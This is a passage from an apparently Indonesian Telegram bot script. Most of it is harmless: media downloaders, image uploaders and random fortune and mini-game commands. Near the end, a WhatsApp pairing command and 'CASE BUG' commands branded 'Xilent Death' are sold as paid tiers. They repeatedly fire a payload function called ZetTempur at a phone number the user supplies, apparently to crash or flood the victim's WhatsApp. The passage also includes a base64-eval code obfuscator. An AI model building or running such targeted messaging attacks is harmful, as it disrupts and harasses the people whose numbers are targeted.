    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh\n- Internet lu kentang");
  }
});

bot.command(/\/gethtml(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = (match[1] || "").trim();

  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(
      chatId,
      "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil source code dari URL...");

    const res = await axios.get(url, { responseType: "text", timeout: 30000 });
    const html = res.data;

    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    await bot.sendDocument(chatId, filePath, {}, { filename: "source_code.html", contentType: "text/html" });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ *Terjadi kesalahan:*\n\`${err.message}\``, { parse_mode: "Markdown" });
  }
});

// ========== CATBOX DOWNLOADER (VERSI SIMPLE) ==========

bot.command("catbox", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const url = args[1];
  
  if (!url) {
    return ctx.reply(
`📥 *DOWNLOAD CATBOX* 📥

*Cara pakai:*
/catbox https://files.catbox.moe/xxxxx.jpg

*Support file:*
Gambar, Video, Audio, Dokumen

📌 *Maksimal file: 50MB*`,
      { parse_mode: "Markdown" }
    );
  }
  
  if (!url.includes('files.catbox.moe')) {
    return ctx.reply("❌ Bukan URL Catbox yang valid!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengunduh file...*", { parse_mode: "Markdown" });
  
  try {
    // Kirim langsung pake URL
    const ext = url.split('.').pop().toLowerCase();
    
    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
      await ctx.replyWithPhoto(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) {
      await ctx.replyWithVideo(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp3', 'wav', 'ogg'].includes(ext)) {
      await ctx.replyWithAudio(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else {
      await ctx.replyWithDocument(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    }
  } catch (err) {
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", { parse_mode: "Markdown" });
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

// ========== CEK MASA DEPAN ==========
bot.command("cekmasadepan", async (ctx) => {
  let targetName = "Kamu";
  
  // Cek apakah reply ke pesan orang
  if (ctx.message.reply_to_message) {
    const target = ctx.message.reply_to_message.from;
    targetName = target.first_name || "Dia";
  } else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) {
      targetName = args.slice(1).join(" ");
    }
  }
  
  // Data random
  const profesi = [
    "Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", 
    "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚",
    "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️",
    "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"
  ];
  
  const kekayaan = [
    "Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵",
    "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎",
    "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"
  ];
  
  const jodoh = [
    "Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸",
    "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊",
    "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"
  ];
  
  const rumah = [
    "Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️",
    "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️",
    "Rumah Impian ✨", "Kontrakan Dulu 😅"
  ];
  
  const kendaraan = [
    "Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡",
    "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️",
    "Helikopter Pribadi 🚁", "Naik Angkot 😂"
  ];
  
  const nasib = [
    "Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧",
    "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨",
    "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"
  ];
  
  // Random pilih
  const hasilProfesi = profesi[Math.floor(Math.random() * profesi.length)];
  const hasilKekayaan = kekayaan[Math.floor(Math.random() * kekayaan.length)];
  const hasilJodoh = jodoh[Math.floor(Math.random() * jodoh.length)];
  const hasilRumah = rumah[Math.floor(Math.random() * rumah.length)];
  const hasilKendaraan = kendaraan[Math.floor(Math.random() * kendaraan.length)];
  const hasilNasib = nasib[Math.floor(Math.random() * nasib.length)];
  
  const pesan = 
`
<blockquote>
🔮 RAMALAN MASA DEPAN 🔮
Untuk: ${targetName}

━━━━━━━━━━━━━━━━━━━━━━

👔 Profesi: ${hasilProfesi}
💰 Kekayaan: ${hasilKekayaan}
❤️ Jodoh: ${hasilJodoh}
🏠 Rumah: ${hasilRumah}
🚗 Kendaraan: ${hasilKendaraan}
🍀 Nasib:  ${hasilNasib}

━━━━━━━━━━━━━━━━━━━━━━
✨ Hasil ini hanya hiburan ya!
💪 Masa depan ada di tanganmu sendiri!

🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>`;

  ctx.reply(pesan, { parse_mode: "HTML" });
});

// COMMAND SINGKAT (opsional)
bot.command("ramal", async (ctx) => {
  const args = ctx.message.text.split(" ");
  let nama = "Kamu";
  if (args.length > 1) nama = args.slice(1).join(" ");
  
  const hasil = [
    "Sukses besar di usia 30an! 🎉",
    "Jadi pengusaha terkenal! 🏢",
    "Punya pasangan idaman! ❤️",
    "Hidup bahagia sampai tua! 😊",
    "Bisa beli rumah mewah! 🏰",
    "Keliling dunia bareng keluarga! 🌍",
    "Jadi orang yang bermanfaat! ✨"
  ];
  
  const random = hasil[Math.floor(Math.random() * hasil.length)];
  ctx.reply(`🔮 *Ramalan untuk ${nama}:*\n\n✨ ${random}\n\n🔮 *Ketik /ramal [nama] lagi!*`, { parse_mode: "HTML" });
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
// ========== CEK CUACA (HIBURAN) ==========
bot.command("cuaca", async (ctx) => {
  const kondisi = [
    "Cerah ☀️", "Berawan 🌥️", "Hujan Ringan 🌦️", "Hujan Lebat 🌧️",
    "Badai ⛈️", "Mendung 🌫️", "Panas Terik 🔥", "Dingin 🥶"
  ];
  
  const suhu = Math.floor(Math.random() * 20) + 20; // 20-40°C
  const kelembaban = Math.floor(Math.random() * 50) + 40; // 40-90%
  const randomKondisi = kondisi[Math.floor(Math.random() * kondisi.length)];
  
  ctx.reply(
`
<blockquote>
🌤️ PRAKIRAAN CUACA*l 🌤️

📌 Kondisi: ${randomKondisi}
🌡️ Suhu: ${suhu}°C
💧 Kelembaban: ${kelembaban}%
💨 Angin: ${Math.floor(Math.random() * 20) + 5} km/jam

✨ Perkiraan ini hanya hiburan ya!
🔮 Cuaca sebenarnya bisa berbeda</blockquote>`,
    { parse_mode: "HTML" }
  );
});
// ========== UPLOAD KE TELEGRAPH (GAMPANG & PASTI JALAN) ==========
bot.command("catboxurl", async (ctx) => {
  // Cek reply foto
  if (!ctx.message.reply_to_message) {
    return ctx.reply(
`📸 UPLOAD GAMBAR 📸

Cara pakai:
1. Kirim foto
2. Reply foto itu
3. Ketik /catboxurl

✅ Gratis, cepat, permanen!`,
      { parse_mode: "Markdown" }
    );
  }
  
  let fileId = null;
  let replied = ctx.message.reply_to_message;
  
  if (replied.photo) {
    fileId = replied.photo[replied.photo.length - 1].file_id;
  } else if (replied.document && replied.document.mime_type?.startsWith('image/')) {
    fileId = replied.document.file_id;
  } else {
    return ctx.reply("❌ Harus berupa foto!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengupload...*", { parse_mode: "Markdown" });
  
  try {
    // Dapatkan file dari Telegram
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    
    // Upload ke Telegraph
    const postData = JSON.stringify([{ url: fileUrl }]);
    
    const options = {
      hostname: 'telegra.ph',
      path: '/upload',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const request = https.request(options, (response) => {
      let data = '';
      response.on('data', (chunk) => { data += chunk; });
      response.on('end', () => {
        try {
          const result = JSON.parse(data);
          if (result[0] && result[0].src) {
            ctx.reply(
`✅ Upload Berhasil! ✅

🔗 Link: https://telegra.ph${result[0].src}

📌 Klik link untuk lihat gambar
💾 Link permanent!`,
              { parse_mode: "Markdown" }
            );
          } else {
            ctx.reply("❌ Gagal upload! Coba lagi.", { parse_mode: "Markdown" });
          }
        } catch (err) {
          ctx.reply("❌ Error parsing response!", { parse_mode: "Markdown" });
        }
      });
    });
    
    request.write(postData);
    request.end();
    
  } catch (err) {
    ctx.reply("❌ Terjadi kesalahan!", { parse_mode: "Markdown" });
  }
});
// ========== ENKRIPSI KODE JS (NO ERROR - FIX) ==========

function simpleEncode(code) {
  let encoded = Buffer.from(code).toString('base64');
  return `eval(Buffer.from('${encoded}', 'base64').toString())`;
}

function simpleDecode(encrypted) {
  try {
    let match = encrypted.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
    if (match) {
      return Buffer.from(match[1], 'base64').toString();
    }
    return null;
  } catch(e) {
    return null;
  }
}

// COMMAND ENKRIPSI (FIX REPLY)
bot.command("encjs", (ctx) => {
  let code = "";
  
  // PRIORITAS: Ambil dari reply
  if (ctx.message.reply_to_message) {
    let replied = ctx.message.reply_to_message;
    if (replied.text) {
      code = replied.text;
    } else if (replied.caption) {
      code = replied.caption;
    }
  }
  
  // Jika tidak ada reply, ambil dari argumen
  if (!code) {
    let args = ctx.message.text.split(" ");
    args.shift();
    code = args.join(" ");
  }
  
  // Jika masih kosong, tampilkan bantuan
  if (!code.trim()) {
    return ctx.reply(
`🔒 *ENKRIPSI KODE JS* 🔒

📌 *Cara pakai:*
• /encjs console.log("Halo")
• Atau *reply* pesan yang berisi kode, lalu ketik /encjs

✅ *Contoh:*
[Kamu kirim pesan: console.log("test")]
[Lalu reply pesan itu dengan /encjs]`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleEncode(code);
  
  ctx.reply(
`🔐 *KODE TERPROTEKSI* 🔐

\`\`\`javascript
${hasil}
\`\`\`

📌 *Simpan kode asli!*`,
    { parse_mode: "Markdown" }
  );
});

// COMMAND DEKRIPSI
bot.command("decjs", (ctx) => {
  let encrypted = "";
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
    encrypted = ctx.message.reply_to_message.text;
  } else {
    let args = ctx.message.text.split(" ");
    args.shift();
    encrypted = args.join(" ");
  }
  
  if (!encrypted.trim()) {
    return ctx.reply(
`🔓 *DEKRIPSI KODE JS* 🔓

📌 *Cara pakai:*
Reply pesan yang berisi kode terenkripsi, lalu ketik /decjs`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleDecode(encrypted);
  
  if (hasil) {
    ctx.reply(
`🔓 *KODE ASLI* 🔓

\`\`\`javascript
${hasil}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", { parse_mode: "Markdown" });
  }
});
// ===== CASE LIAT HARGA + BUTTON ADMIN =====
bot.command('harga', async (ctx) => {
    try {
        const teks = `
╭───「 𝘓𝘐𝘚𝘛 𝘏𝘈𝘙𝘎𝘈 𝘛𝘐𝘛𝘓𝘌 」───╮
│
│ • Full Up : 5,000
│ • Reseller : 15,000
│ • Partner : 20,000
│ • Moderator : 25,000
│ • Ceo : 35,000
│ • Owner : 45,000
│
╰────────────────────╯

◍BUY/UP SILAHKAN CHAT ADMIN DI BAWAH◍
        `;

        await ctx.reply(teks, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "👤 Developer", url: "https://t.me/gaponback" },
                    ]
                ]
            }
        });

    } catch (err) {
        console.log(err);
        ctx.reply('Gagal menampilkan harga, coba lagi nanti.');
    }
});
// ========== 10 TOOLS SERU-SERUAN ==========

// 1. Cek Jodoh (random)
bot.command("jodoh", (ctx) => {
  const persen = Math.floor(Math.random() * 100) + 1;
  const status = persen > 70 ? "Cocok banget! 💖" : (persen > 40 ? "Bisa jadi 😊" : "Kurang cocok 😅");
  ctx.reply(`💘 *Cek Jodoh*\nKecocokan: ${persen}%\nStatus: ${status}`, { parse_mode: "Markdown" });
});

// 2. Ramalan Shio (random)
bot.command("shio", (ctx) => {
  const ramalan = ["Hoki besar 🍀", "Lumayan beruntung ✨", "Biasa aja 😶", "Kurang bagus 😕", "Sial dikit 🤣"];
  const random = ramalan[Math.floor(Math.random() * ramalan.length)];
  ctx.reply(`🐉 *Ramalan Shio hari ini:* ${random}`, { parse_mode: "Markdown" });
});

// 3. Tebak Angka (game)
let tebakAngka = {};
bot.command("tebak", (ctx) => {
  const userId = ctx.from.id;
  if (!tebakAngka[userId]) {
    tebakAngka[userId] = Math.floor(Math.random() * 10) + 1;
    return ctx.reply("🎲 *Tebak Angka (1-10)*\nKetik /tebak [angka]\nContoh: /tebak 5", { parse_mode: "Markdown" });
  }
  const args = ctx.message.text.split(" ");
  const tebakan = parseInt(args[1]);
  if (isNaN(tebakan)) return ctx.reply("Masukkan angka 1-10!");
  if (tebakan === tebakAngka[userId]) {
    ctx.reply("🎉 *Benar!* Selamat! 🎉\nKetik /tebak lagi untuk main baru.");
    delete tebakAngka[userId];
  } else {
    ctx.reply(`❌ Salah! Angka rahasianya bukan ${tebakan}. Coba lagi.`);
  }
});

// 4. Kata Motivasi random
bot.command("motivasi", (ctx) => {
  const quotes = [
    "✨ Jangan menyerah, hari ini berat besok mungkin indah.",
    "💪 Sukses dimulai dari keberanian untuk memulai.",
    "🌟 Percaya sama diri sendiri, itu kunci utama.",
    "🌱 Proses tidak akan mengkhianati hasil.",
    "🚀 Bermimpilah tinggi, lalu kejar!"
  ];
  const random = quotes[Math.floor(Math.random() * quotes.length)];
  ctx.reply(`💡 *Motivasi:* ${random}`, { parse_mode: "Markdown" });
});

// 5. Batu-gunting-kertas (suit)
bot.command("suit", (ctx) => {
  const pilihan = ["batu", "gunting", "kertas"];
  const user = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!user || !pilihan.includes(user)) return ctx.reply("Pilih: /suit batu | gunting | kertas");
  const botChoice = pilihan[Math.floor(Math.random() * 3)];
  let hasil = "";
  if (user === botChoice) hasil = "Seri 🤝";
  else if (
    (user === "batu" && botChoice === "gunting") ||
    (user === "gunting" && botChoice === "kertas") ||
    (user === "kertas" && botChoice === "batu")
  ) hasil = "Kamu menang! 🎉";
  else hasil = "Bot menang! 😭";
  ctx.reply(`✊ Kamu: ${user}\n🤖 Bot: ${botChoice}\n${hasil}`);
});

// 6. Cek kepribadian dari nama (random)
bot.command("kepribadian", (ctx) => {
  const sifat = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💖", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"];
  const random = sifat[Math.floor(Math.random() * sifat.length)];
  ctx.reply(`🧠 *Kepribadianmu:* ${random}`, { parse_mode: "Markdown" });
});

// 7. Ramalan karir random
bot.command("karir", (ctx) => {
  const karir = ["Programmer 💻", "Pengusaha 🏢", "Dokter 🩺", "Guru 📚", "Artis 🎬", "Atlet ⚽"];
  const random = karir[Math.floor(Math.random() * karir.length)];
  ctx.reply(`💼 *Karir masa depanmu:* ${random}`, { parse_mode: "Markdown" });
});

// 8. Cek level ganteng/cantik (random)
bot.command("level", (ctx) => {
  const level = Math.floor(Math.random() * 100) + 1;
  let status = level > 80 ? "Level Dewa/ Dewi 😎" : (level > 50 ? "Cukup menawan 😊" : "Biasa saja 🤭");
  ctx.reply(`📊 *Level ketampanan/kecantikan:* ${level}%\n${status}`, { parse_mode: "Markdown" });
});

// 9. Tebak hari lahir (seru-seruan)
bot.command("harilahir", (ctx) => {
  const hari = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"];
  const random = hari[Math.floor(Math.random() * hari.length)];
  ctx.reply(`🎂 *Hari lahir versi random:* Kamu lahir hari ${random}. (Hanya hiburan)`, { parse_mode: "Markdown" });
});

// 10. Game lempar koin
bot.command("koin", (ctx) => {
  const hasil = Math.random() < 0.5 ? "Kepala 🪙" : "Ekor 💰";
  ctx.reply(`🪙 *Hasil lempar koin:* ${hasil}`, { parse_mode: "Markdown" });
});
// ========== PENCARIAN LAGU (DEEZER) ==========
// Command: /lagu [judul lagu]

bot.command("lagu", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("🎵 Cara pakai: /lagu [judul lagu]\nContoh: /lagu blur song 2", { parse_mode: "Markdown" });
  }

  const status = await ctx.reply(`🔍 *Mencari: ${query}`, { parse_mode: "Markdown" });

  try {
    const res = await fetch(`https://api.deezer.com/search?q=${encodeURIComponent(query)}&limit=1`);
    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `❌ Lagu "${query}" tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const track = data.data[0];
    const judul = track.title;
    const artis = track.artist.name;
    const preview = track.preview;
    const cover = track.album.cover_medium;
    const link = track.link;

    // Hapus pesan "mencari"
    await ctx.telegram.deleteMessage(ctx.chat.id, status.message_id).catch(() => {});

    // Kirim cover + info
    if (cover) {
      await ctx.replyWithPhoto(cover, {
        caption: `🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`,
        parse_mode: "Markdown"
      });
    } else {
      await ctx.reply(`🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`, { parse_mode: "Markdown" });
    }

    // Kirim audio preview jika ada
    if (preview && preview !== "null") {
      await ctx.replyWithAudio(preview, {
        title: judul,
        performer: artis,
        caption: "🎧 *Preview 30 detik*"
      });
    } else {
      await ctx.reply("⚠️ *Preview audio tidak tersedia untuk lagu ini.*", { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, "❌ Terjadi kesalahan. Coba lagi nanti.", { parse_mode: "Markdown" }).catch(() => {
      ctx.reply("❌ Terjadi kesalahan. Coba lagi nanti.");
    });
  }
});
// ========== FOTO JADI HD (UPSCALE) ==========
// Gunakan API PicWish (gratis, tanpa API key)

bot.command("hd", async (ctx) => {
  // Cek apakah user reply ke sebuah foto
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply(
`📸 CARA PAKAI:\n1. Kirim foto ke bot\n2. Reply foto tersebut\n3. Ketik /hd\n\n✨ *Hasil: Foto akan di-upgrade ke resolusi lebih tinggi & lebih tajam!`
    );
  }

  const statusMsg = await ctx.reply("⏳ *Memproses foto...* (bisa makan waktu 10-20 detik mohon bersabar...)");

  try {
    // Ambil file ID foto dengan resolusi tertinggi
    const photo = ctx.message.reply_to_message.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto ke buffer
    const response = await fetch(fileUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    // Upload ke PicWish API
    const form = new FormData();
    form.append("image_file", buffer, { filename: "image.jpg" });
    form.append("type", "clean"); // "clean" = umum, "face" = wajah
    form.append("scale_factor", "4"); // 4 = 4x lebih besar

    const upscaleRes = await fetch("https://api.picwish.com/v1/photo-enhancer", {
      method: "POST",
      body: form,
    });

    const result = await upscaleRes.json();
    if (!result.image_url) throw new Error();

    // Kirim hasil
    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(result.image_url, {
      caption: "✅ *Foto berhasil ditingkatkan kualitasnya!*",
    });
  } catch (err) {
    console.error("HD Error:", err);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      "❌ Gagal memproses foto. Coba foto lain atau coba lagi nanti."
    );
  }
});
// ================= CONNECT ================= //
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Restart bot dulu.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://e.top4top.io/p_3818jmyvr1.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`
\`\`\`js
⬡═―⊱「 Xilent Death Pairing 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ  Nomor  : ${phoneNumber}
ϟ  Kode   : ${formattedCode}
ϟ  Note  : KALO GAGAL PAIR HAPUS SESSION AJA

ϟ  🟡 Status : 𝙎𝙚𝙙𝙖𝙣𝙜 𝙈𝙚𝙣𝙜𝙝𝙪𝙗𝙪𝙣𝙜𝙠𝙖𝙣....
\`\`\`
`,
        parse_mode: "Markdown"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing!");
  }
});



// ================= KILL SESSION ================= //
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session dihapus, silakan /connect kembali");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session");
  }
});
/// ============= CASE BUG 1 BEBAS SPAM=============\\\
bot.command("Xsilent", checkChannels, checkLocked, checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /Xsilent 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const username = ctx.from.username || ctx.from.first_name;
  const time = new Date().toLocaleTimeString("id-ID");

  await ctx.reply(
`<blockquote><b>𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 𝑽𝒗𝒊𝒑
ᝰ.ᐟ Target : ✆ ${q}
 🕷 Status : 𝐓𝐞𝐫𝐤𝐢𝐫𝐢𝐦 𝐊𝐞 𝐓𝐚𝐫𝐠𝐞𝐭
</b></blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}`, style: "danger", icon_custom_emoji_id: "5355021020572962395" }
          ]
        ]
      }  
    }
  );
    
  (async () => {
    for (let r = 0; r < 15; r++) {
      await ZetTempur(sock, target);
      await sleep(1000); 
    }
  })();
});

/// ============= CASE BUG 2 BEBAS SPAM=============\\\
bot.command("Xinfinity", checkChannels, checkLocked, checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /Xinfinity 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
`<blockquote><b>𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 𝑽𝒗𝒊𝒑
ᝰ.ᐟ Target : ✆ ${q}
 🕷 Status : 𝐓𝐞𝐫𝐤𝐢𝐫𝐢𝐦 𝐊𝐞 𝐓𝐚𝐫𝐠𝐞𝐭
</b></blockquote>`,
    { parse_mode: "HTML" }
  );

  (async () => {
    for (let i = 0; i < 15; i++) {
      await ZetTempur(sock, target);
    }
  })();
});
/// ============= CASE BUG 3 BEBAS SPAM=============\\\
bot.command("Xoya", checkChannels, checkLocked, checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /Xoya 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const time = new Date().toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });

  await ctx.reply(
    `
<blockquote><b>𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 𝑽𝒗𝒊𝒑
ᝰ.ᐟ Target : ✆ ${q}
 🕷 Status : 𝐓𝐞𝐫𝐤𝐢𝐫𝐢𝐦 𝐊𝐞 𝐓𝐚𝐫𝐠𝐞𝐭
</b></blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}`, style: "danger", icon_custom_emoji_id: "5355021020572962395" }
          ]
        ]
      }
    }
  );

  (async () => {
    for (let r = 0; r < 20; r++) {
      await ZetTempur(sock, target);
      await sleep(1000);
    }
  })();

});

bot.command("IntersOrders", checkChannels, checkLocked, checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
